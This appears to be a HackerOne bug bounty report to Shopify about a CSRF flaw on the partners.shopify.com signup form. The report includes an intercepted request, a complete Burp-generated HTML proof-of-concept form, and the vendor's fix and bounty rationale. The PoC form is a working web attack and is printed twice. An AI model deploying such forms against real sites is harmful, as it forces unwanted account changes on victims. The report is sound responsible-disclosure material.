title: authenticity token not verfied leads to change business name

profile.name: Shopify
profile.about: Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.

vulnerability_information:
Hello security team , 
while sign up I have noticed that authenticity token is not verified leads to change info like business name
#Steps to reproduce
1- visit this url https://www.shopify.com/partners and add you mail then click on join now
2- Then fill out your data and click on create new partner account fill out the data then intercept the request with burp proxy
I have notice is that the request looks like this 
```
POST /signup HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://partners.shopify.com/signup
Content-Type: application/x-www-form-urlencoded
Content-Length: 690
Connection: close
Cookie: █████
Upgrade-Insecure-Requests: 1

authenticity_token=2vAI2NSYAWswz76VP5oZOX9qsoS%2BriQxAkUstj53i1xLI59byffVldnssNEjtHqZKcM%2BQ1VRq5kheL5Vibf%2FTw%3D%3D&organization%5Bbusiness_name%5D=df&organization%5Bbusiness_email%5D=cforu%2B6%40wearehackerone.com&organization%5Bwebsite%5D=&address%5Baddress1%5D=fake&address%5Baddress2%5D=&address%5Bcity%5D=cairo&address%5Bcountry_code%5D=EG&address%5Bprovince_code%5D=C&address%5Bpostal_code%5D=123&signup_profile_form%5Bprimary_revenue_intent%5D=other&signup_profile_form%5Bcustom_primary_revenue_intent%5D=bug+bounty&signup_profile_form%5Bcustom_other_platforms%5D=&signup_profile_form%5Bother_platforms%5D%5B%5D=no_platform&partner_agreement_accepted=0&partner_agreement_accepted=1
```
now generate csrf poc with burp suite and try to change the value of the ```authenticity_token``` paramter notice that here the request will go through
I have attached a video to make it easy for you

As a summary
The problem is that the ```authenticity_token``` is not properly validated and leads to change info being submitted what i was doing in the video is that i tried to change two or more chars to prove that it may be validating the length of the token I don't know actually but it works

## Impact

forcing user to change settings like business name
vulnerability_information_html:
Hello security team ,
while sign up I have noticed that authenticity token is not verified leads to change info like business name

Steps to reproduce

1- visit this url https://www.shopify.com/partners and add you mail then click on join now
2- Then fill out your data and click on create new partner account fill out the data then intercept the request with burp proxy
I have notice is that the request looks like this 

POST /signup HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://partners.shopify.com/signup
Content-Type: application/x-www-form-urlencoded
Content-Length: 690
Connection: close
Cookie: █████
Upgrade-Insecure-Requests: 1

authenticity_token=2vAI2NSYAWswz76VP5oZOX9qsoS%2BriQxAkUstj53i1xLI59byffVldnssNEjtHqZKcM%2BQ1VRq5kheL5Vibf%2FTw%3D%3D&organization%5Bbusiness_name%5D=df&organization%5Bbusiness_email%5D=cforu%2B6%40wearehackerone.com&organization%5Bwebsite%5D=&address%5Baddress1%5D=fake&address%5Baddress2%5D=&address%5Bcity%5D=cairo&address%5Bcountry_code%5D=EG&address%5Bprovince_code%5D=C&address%5Bpostal_code%5D=123&signup_profile_form%5Bprimary_revenue_intent%5D=other&signup_profile_form%5Bcustom_primary_revenue_intent%5D=bug+bounty&signup_profile_form%5Bcustom_other_platforms%5D=&signup_profile_form%5Bother_platforms%5D%5B%5D=no_platform&partner_agreement_accepted=0&partner_agreement_accepted=1

now generate csrf poc with burp suite and try to change the value of the authenticity_token paramter notice that here the request will go through
I have attached a video to make it easy for you

As a summary
The problem is that the authenticity_token is not properly validated and leads to change info being submitted what i was doing in the video is that i tried to change two or more chars to prove that it may be validating the length of the token I don't know actually but it works

Impact

forcing user to change settings like business name

activities.message: notice that in my video the business name is changed to evil actually you are free to change any other field
activities.markdown_message: notice that in my video the business name is changed to evil actually you are free to change any other field

activities.message: I can confirm now that the token is not validated as it is i have tried the same poc code in two different browser with the same ```authenticity_token```
activities.markdown_message: I can confirm now that the token is not validated as it is i have tried the same poc code in two different browser with the same authenticity_token

activities.message:
POC code
```
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://partners.shopify.com/signup" method="POST">

      <input type="hidden" name="authenticity_token" value="n8Y3BLP2sozyRNkrLstPnI3ZlWwB04qo35Jb6ZyXVgbN2SDoxxbr1OFswpY4+/cJ3qhLq0hjp6VYbUHj1gqzuQ==" />

      <input type="hidden" name="organization[business_name]" value="evilo" />

      <input type="hidden" name="organization[business_email]" value="cforu+54@wearehackerone.com" />

      <input type="hidden" name="organization[website]" value="" />

      <input type="hidden" name="address[address1]" value="test" />

      <input type="hidden" name="address[address2]" value="" />

      <input type="hidden" name="address[city]" value="test" />

      <input type="hidden" name="address[country_code]" value="EG" />

      <input type="hidden" name="address[province_code]" value="C" />

      <input type="hidden" name="address[postal_code]" value="123" />

      <input type="hidden" name="signup_profile_form[primary_revenue_intent]" value="other" />

      <input type="hidden" name="signup_profile_form[custom_primary_revenue_intent]" value="test bug bounty" />

      <input type="hidden" name="signup_profile_form[custom_other_platforms]" value="" />

      <input type="hidden" name="signup_profile_form[other_platforms][]" value="no_platform" />

      <input type="hidden" name="partner_agreement_accepted" value="0" />

      <input type="hidden" name="partner_agreement_accepted" value="1" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>
```
This works on any request

POC code

<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

    <form action="https://partners.shopify.com/signup" method="POST">

      <input type="hidden" name="authenticity_token" value="n8Y3BLP2sozyRNkrLstPnI3ZlWwB04qo35Jb6ZyXVgbN2SDoxxbr1OFswpY4+/cJ3qhLq0hjp6VYbUHj1gqzuQ==" />

      <input type="hidden" name="organization[business_name]" value="evilo" />

      <input type="hidden" name="organization[business_email]" value="cforu+54@wearehackerone.com" />

      <input type="hidden" name="organization[website]" value="" />

      <input type="hidden" name="address[address1]" value="test" />

      <input type="hidden" name="address[address2]" value="" />

      <input type="hidden" name="address[city]" value="test" />

      <input type="hidden" name="address[country_code]" value="EG" />

      <input type="hidden" name="address[province_code]" value="C" />

      <input type="hidden" name="address[postal_code]" value="123" />

      <input type="hidden" name="signup_profile_form[primary_revenue_intent]" value="other" />

      <input type="hidden" name="signup_profile_form[custom_primary_revenue_intent]" value="test bug bounty" />

      <input type="hidden" name="signup_profile_form[custom_other_platforms]" value="" />

      <input type="hidden" name="signup_profile_form[other_platforms][]" value="no_platform" />

      <input type="hidden" name="partner_agreement_accepted" value="0" />

      <input type="hidden" name="partner_agreement_accepted" value="1" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>

This works on any request

activities.message: Hey I have discovered that this csrf bug forces the user to add a new partner account even after verifying the email
activities.markdown_message: Hey I have discovered that this csrf bug forces the user to add a new partner account even after verifying the email

activities.message: Also another notice is that if the attacker placed his email and verify it will lead to account takeover I hope that this can update the severity to high
activities.markdown_message: Also another notice is that if the attacker placed his email and verify it will lead to account takeover I hope that this can update the severity to high

activities.message:
Hi @cfou,

Thank you for the report. We're still investigating this issue and will get back to you with an update as soon as we can.
activities.markdown_message:
Hi @cfou,

Thank you for the report. We're still investigating this issue and will get back to you with an update as soon as we can.

activities.message:
@jack_mccracken Hi 
Thanks for your response I hope to hear your feedback asap
activities.markdown_message:
@jack_mccracken Hi
Thanks for your response I hope to hear your feedback asap

activities.message:
Hi @cforu,

Thank you for the report. We have deployed a fix for this issue and you should no longer be able to reproduce it. For this reason, we will close it as Resolved. You should hear from us next week regarding a bounty decision.
activities.markdown_message:
Hi @cforu,

Thank you for the report. We have deployed a fix for this issue and you should no longer be able to reproduce it. For this reason, we will close it as Resolved. You should hear from us next week regarding a bounty decision.

activities.message:
I have something to add to this report to make it's severity high 
when the attacker click on confirm email it will issue the following request
```
GET /1759784/confirm_business_email/█████████ HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: █████████
Upgrade-Insecure-Requests: 1
```
notice this value ```██████``` which in normal case can't be guessed by the attacker but it has this value ```1759784``` which can be guessed easily and by sending this request to burp repeater it will show the response code 302 found in case of it's correct otherwise it will show 404 not found

from this point I can get access to core shopify account and get all data about the victim
activities.markdown_message:
I have something to add to this report to make it's severity high
when the attacker click on confirm email it will issue the following request

GET /1759784/confirm_business_email/█████████ HTTP/1.1
Host: partners.shopify.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: █████████
Upgrade-Insecure-Requests: 1

notice this value ██████ which in normal case can't be guessed by the attacker but it has this value 1759784 which can be guessed easily and by sending this request to burp repeater it will show the response code 302 found in case of it's correct otherwise it will show 404 not found

from this point I can get access to core shopify account and get all data about the victim

activities.message:
Hello team ,
After digging more into your application I discovered that the behaviour described above will not work because i simply try to change browser and it doesn't work however the attacker can generate another csrf poc with this request and forces the user submits the form again which will verify his email address
activities.markdown_message:
Hello team ,
After digging more into your application I discovered that the behaviour described above will not work because i simply try to change browser and it doesn't work however the attacker can generate another csrf poc with this request and forces the user submits the form again which will verify his email address

activities.message:
Hi @cforu,

Thanks again for your report! We’re awarding a $1900 bounty for this issue. Please find below our rationale generated using our [CVSS calculator](https://shopify.github.io/appsec/cvss_calculator/).

## Base Score CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N 4.3
## Environment: Core

#### Attack Complexity: L
* Specific conditions to exploit?: Yes
* Extensive effort to exploit?: No

#### Privileges Required: L
* Requires privileged account (not self-registered)?: No

#### User Interaction: R
* Requires victim to perform some action during exploit?: Yes

#### Scope: U
* Can the attacker impact a separate service?: No

#### Confidentiality: N
* How much data could be accessed?: None

#### Integrity: L
* How much data could be changed?: Some
* How much of Shopify is impacted?: Some

#### Availability: N
* Level of disruption to network service?: None
